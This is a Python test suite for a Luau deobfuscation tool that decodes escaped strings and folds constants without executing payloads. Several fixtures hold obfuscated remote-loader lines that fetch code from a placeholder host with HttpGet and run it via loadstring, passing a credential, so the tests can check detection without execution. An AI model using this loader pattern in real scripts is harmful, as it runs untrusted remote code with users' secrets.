"""Real native Luau tests for source cleanup, preservation and API selection."""
import hashlib
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from unittest.mock import patch

from fastapi.testclient import TestClient
from native_luau import check
from native_tools import ast_digest, parse_ast, string_bytes, nodes
from readable import cleanup
from recovery_v2 import run
import server


class NativeReadabilityTests(unittest.TestCase):
    def setUp(self):
        for name in ('luau', 'luau-compile', 'luau-ast', 'stylua'):
            self.assertIsNotNone(shutil.which(name), name + ' is required, not skipped')
        self.temp = tempfile.TemporaryDirectory(); self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)

    def apply(self, text):
        source = self.root / 'input.luau'; source.write_text(text, encoding='utf8')
        output = self.root / 'output'
        report = cleanup(source, output, seconds=20)
        self.assertTrue(report['validation']['inputCompile']['ok'], report)
        selected = output / report['primary'] if report['primary'] != source.name else source
        return report, selected.read_text(), selected

    def matches(self, text, selected):
        a = check(self.root / 'input.luau', 'trace', self.root)
        b = check(selected, 'trace', self.root)
        self.assertTrue(a['ok'], a); self.assertTrue(b['ok'], b)
        self.assertEqual(a['events'], b['events']); self.assertEqual(a['returns'], b['returns'])

    def test_escaped_url_default_output(self):
        source = self.root / 'input.luau'
        source.write_text(r'local url="\104\116\116\112\115\058\047\047example.invalid/test.lua"' + '\nreturn url')
        with patch.dict(os.environ, {'LUAUVMP_STRICT_CAPTURE': '1'}):
            report = run(source, self.root / 'result', 30)
        self.assertEqual(report['outcome'], 'literals-decoded')
        self.assertNotEqual(report['primary'], 'program.source.luau')
        self.assertIn('https://example.invalid/test.lua', (self.root / 'result' / report['primary']).read_text())
        self.assertEqual(report['escaped_literals_decoded'], 1)
        self.assertFalse(report['complete_devirtualization']); self.assertFalse(report['final_payload_executed'])
        self.assertEqual((self.root / 'result/original.input.luau').read_bytes(), source.read_bytes())

    def test_modern_syntax_uses_same_cleanup(self):
        report, text, selected = self.apply(r'type R={x:number}; local r:R={x=0}; r.x+=3; for _,x in {1,2} do if x==1 then continue end end; local s="\104ello"; return if r.x==3 then `{s}` else "bad"')
        self.assertEqual(report['escapedLiteralsDecoded'], 1); self.matches(text, selected)

    def test_unicode_byte_offsets_and_unicode_escapes(self):
        report, text, selected = self.apply('local unicode="é🐈"; local message="\\104ello \\240\\159\\144\\136"; return unicode,message')
        self.assertIn('hello 🐈', text); self.assertEqual(report['escapedLiteralsDecoded'], 1)
        self.matches(text, selected)

    def test_binary_bytes_and_nul_are_preserved(self):
        source = r'local payload="\000\255\134\001"; local msg="\104ello"; return payload,msg'
        report, text, selected = self.apply(source)
        self.assertIn(r'"\000\255\134\001"', text)
        self.assertEqual(report['opaqueBinaryLiterals'], 1); self.matches(text, selected)

    def test_comments_and_long_strings_are_not_regex_decoded(self):
        source = '-- \\104 must remain in this comment\nlocal a=[[\\104]]; local b="\\104"; return a,b'
        report, text, selected = self.apply(source)
        self.assertIn('-- \\104 must remain', text); self.assertIn('[[\\104]]', text)
        self.assertEqual(report['escapedLiteralsDecoded'], 1); self.matches(text, selected)

    def test_uncalled_function_is_retained_and_inspected(self):
        report, text, _ = self.apply(r'local function uncalled() return "\119orld" end; return "ok"')
        self.assertIn('uncalled', text); self.assertIn('"world"', text)
        inventory = json.loads((self.root / 'output/program.inspection.json').read_text())
        self.assertEqual(inventory['functions'][0]['name'], 'uncalled')
        self.assertIsNone(inventory['functions'][0]['executed'])

    def test_verified_arithmetic_and_boolean_constants(self):
        report, text, selected = self.apply('local a=987654-987653; local b=(800%17); local c=not(false or false); return a,b,c')
        self.assertGreaterEqual(report['constantExpressionsFolded'], 3); self.matches(text, selected)

    def test_adjacent_tokens_remain_valid(self):
        report, text, selected = self.apply('local value=0;for i=1,4-1 do value+=1 end;if 1+1==2 then value+=1 end;return value')
        self.assertGreaterEqual(report['constantExpressionsFolded'], 2); self.matches(text, selected)

    def test_unknown_calls_not_removed_by_constant_cleanup(self):
        report, text, _ = self.apply(r'local a=false and mysterious("\104"); return a')
        self.assertIn('mysterious', text); self.assertIn('false and', text)

    def test_mutable_captures_and_nil_arity(self):
        report, text, selected = self.apply(r'local n=0;local function f() n+=1;return n,nil,"\120" end; local a,b,c=f(); print(a,b,c); return f()')
        self.matches(text, selected)

    def test_loader_dependencies_not_executed(self):
        source = self.root / 'input.luau'
        source.write_text(r'local credential=...;local u="\104\116\116\112\115://example.invalid/runtime.lua";local compile=loadstring;local data=game:HttpGet(u);_bsdata0={"\000\255",19,23};return compile(data)(credential)')
        for mode in ('0', '1'):
            with patch.dict(os.environ, {'LUAUVMP_STRICT_CAPTURE': mode}):
                report = run(source, self.root / ('mode' + mode), 30)
            self.assertEqual(report['family'], 'external-loader'); self.assertTrue(report['partial'])
            self.assertFalse(report['final_payload_executed']); self.assertFalse(report['external_effects_allowed'])
            self.assertEqual(report['opaque_binary_literals'], 1)
            text = (self.root / ('mode' + mode) / report['primary']).read_text()
            self.assertIn('credential', text); self.assertIn('_bsdata0', text); self.assertIn('HttpGet', text)

    def test_reference_constants_do_not_use_reassigned_local(self):
        report, _, _ = self.apply('local url="https://example.invalid/a";url=unknown;local other=url.."/b";return other')
        inspection = json.loads((self.root / 'output/program.inspection.json').read_text())
        self.assertNotIn('https://example.invalid/a/b', [item['url'] for item in inspection['urls']])

    def test_immutable_url_chain(self):
        report, _, _ = self.apply('local url="https://example.invalid/a";local other=url.."?x=1";return other')
        self.assertEqual(report['urlCount'], 2)

    def test_embedded_source_is_extracted_not_executed(self):
        report, text, _ = self.apply(r'local compiler=loadstring;return compiler("print(\"owned embedded source\")")()')
        self.assertEqual(len(report['embeddedSources']), 1)
        item = report['embeddedSources'][0]
        self.assertTrue(item['compile']['ok']); self.assertFalse(item['executed'])
        self.assertEqual((self.root / 'output' / item['artifact']).read_text(), 'print("owned embedded source")')
        self.assertIn('compiler', text)

    def test_shadowed_compile_parameter_is_not_extracted(self):
        report, _, _ = self.apply('local function f(loadstring) return loadstring("print(1)") end; return f')
        self.assertEqual(report['embeddedSources'], [])

    def test_no_application_execution_for_infinite_loop(self):
        source = self.root / 'input.luau'; source.write_text('local s="\\104"; while true do end')
        report = run(source, self.root / 'result', 30)
        self.assertFalse(report['final_payload_executed']); self.assertEqual(report['outcome'], 'literals-decoded')

    def test_no_arbitrary_size_threshold_switch(self):
        report, text, selected = self.apply('local t={}\n' + '\n'.join(f't[{i}]="\\104"' for i in range(1, 501)) + '\nreturn #t')
        self.assertEqual(report['escapedLiteralsDecoded'], 500); self.matches(text, selected)

    def test_unchanged_is_not_devirtualized(self):
        source = self.root / 'input.luau';source.write_text('return 1\n')
        report = run(source, self.root / 'result', 30)
        self.assertEqual(report['outcome'], 'unchanged'); self.assertFalse(report['changed'])
        self.assertFalse(report['complete_devirtualization']); self.assertEqual(report['primary'], 'program.source.luau')

    def test_markdown_original_is_preserved(self):
        source = self.root / 'input.md'; raw = b'```luau\nreturn "\\104"\n```';source.write_bytes(raw)
        report = run(source, self.root / 'result', 30)
        self.assertEqual((self.root / 'result/original.input.luau').read_bytes(), raw)
        self.assertEqual(report['input_sha256'], hashlib.sha256(raw).hexdigest())

    def test_bad_syntax_never_claims_recovery(self):
        source = self.root / 'bad.luau';source.write_text('local = ???')
        with self.assertRaises(ValueError):run(source, self.root / 'result', 30)

    def test_selected_formatted_file_compiles(self):
        report, _, _ = self.apply(r'local x="\104ello";local function f(a:number)return a+1 end;return f(2),x')
        self.assertIn('formattedArtifact', report)
        self.assertTrue(report['validation']['formatting']['compile']['ok'])


class ReadabilityAPITests(unittest.TestCase):
    def setUp(self):
        server.JOBS.clear();server.RATES.clear()
        self.client = TestClient(server.app);self.client.get('/')

    def tearDown(self):
        server.JOBS.clear();server.RATES.clear()

    def submit(self, source, mode='strict'):
        response = self.client.post('/api/jobs', json={'source':source,'name':'owned-test.luau','mode':mode,'timeout':30})
        self.assertEqual(response.status_code, 202, response.text)
        job_id = response.json()['id'];deadline = time.monotonic()+35
        while time.monotonic() < deadline:
            result = self.client.get('/api/jobs/'+job_id).json()
            if result['state'] in ('completed','partial','failed','unsupported','cancelled'):return result
            time.sleep(.03)
        self.fail('API did not reach a terminal state')

    def test_selected_output_really_decodes_url(self):
        job = self.submit(r'local url="\104\116\116\112\115://example.invalid/source.lua";return url')
        self.assertEqual(job['state'], 'completed', job)
        self.assertEqual(job['quality']['escapedLiteralsDecoded'], 1)
        self.assertNotEqual(job['primary'], 'program.source.luau')
        response = self.client.get(f"/api/jobs/{job['id']}/artifact", params={'name':job['primary'],'download':'true'})
        self.assertIn('https://example.invalid/source.lua', response.text)
        self.assertEqual(hashlib.sha256(response.content).hexdigest(), job['quality']['selectedOutputHash'])

    def test_full_modern_syntax_does_not_fail_boundary(self):
        job = self.submit('local x:number=2;local y="\\104";return `{x}:{y}`', 'sandboxed')
        self.assertEqual(job['state'], 'completed', job)
        self.assertFalse(job['quality']['finalPayloadExecuted'])

    def test_unchanged_status_and_preserved_download(self):
        job = self.submit('return 1\n')
        self.assertEqual(job['quality']['outcome'], 'unchanged')
        self.assertFalse(job['quality']['completeDevirtualization'])
        self.assertEqual(job['primary'], 'program.source.luau')

    def test_loader_reports_missing_body_and_retains_credential(self):
        job=self.submit(r'local key=...;local url="\104ttps://example.invalid/test.lua";return loadstring(game:HttpGet(url))(key)', 'sandboxed')
        self.assertEqual(job['state'], 'partial', job)
        self.assertFalse(job['quality']['finalPayloadExecuted']);self.assertEqual(job['quality']['family'], 'external-loader')

    def test_model_trace_never_replaces_full_source(self):
        sys.path.insert(0,str(Path(__file__).resolve().parent))
        from fixture_shapes import protected_literal
        job=self.submit(protected_literal(b'owned observed result'), 'sandboxed')
        self.assertEqual(job['state'], 'partial', job)
        self.assertNotIn(job['primary'], ('program.application.luau','program.observed.luau'))
        self.assertEqual(job['quality']['nativeComparisons'], 3)
        artifact=self.client.get(f"/api/jobs/{job['id']}/artifact",params={'name':'program.observed.luau'})
        self.assertIn('owned observed result', artifact.json()['text'])

if __name__ == '__main__': unittest.main()

class NativePoolTests(unittest.TestCase):
    def pool(self, code):
        from native_pool import recover
        from lua_parse import Parser
        with tempfile.TemporaryDirectory() as folder:
            return recover(code, Parser(code).parse(), Path(folder), 3)

    def test_native_pool_matches_two_seeds(self):
        result=self.pool('return(function(...) local data={"\\104ello","world"};local function at(i)return data[i]end;for i=1,#data do data[i]=string.reverse(string.reverse(data[i]))end;return print(at(1))end)()')
        self.assertEqual(result['table'].raw(1), b'hello')
        self.assertEqual(result['native']['nativeRunsMatched'], 2)
        self.assertTrue(result['allow_inline'])

    def test_array_escape_disables_inlining(self):
        result=self.pool('return(function(...) local data={"hello"};local function at(i)return data[i]end;return(function()data[1]="changed";return at(1)end)()end)()')
        self.assertIsNotNone(result);self.assertFalse(result['allow_inline'])

    def test_accessor_assignment_disables_inlining(self):
        result=self.pool('return(function(...) local data={"hello"};local function at(i)return data[i]end;return(function()at=function()return "changed"end;return at(1)end)()end)()')
        self.assertIsNotNone(result);self.assertFalse(result['allow_inline'])

    def test_host_dependent_prefix_is_not_executed(self):
        result=self.pool('return(function(...) local data={"hello"};local function at(i)return data[i]end;game:HttpGet("https://example.invalid/");return print(at(1))end)()')
        self.assertIsNone(result)
